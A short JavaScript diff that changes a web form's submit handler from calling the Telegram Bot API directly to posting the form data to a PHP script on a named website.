@@ -491,18 +491,15 @@
                 const CHAT_ID = '1882012182';
 
                 try {
-                    // Send to Telegram
-                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    // Send data to PHP script on riwam.com
+                    const response = await fetch('https://riwam.com/telegram.php', {
                         method: 'POST',
                         headers: {
                             'Content-Type': 'application/json'
                         },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message,
-                            parse_mode: 'Markdown'
-                        })
+                        body: JSON.stringify(data) // Envoie les données du formulaire
                     });
+
 
                     const result = await response.json();
 
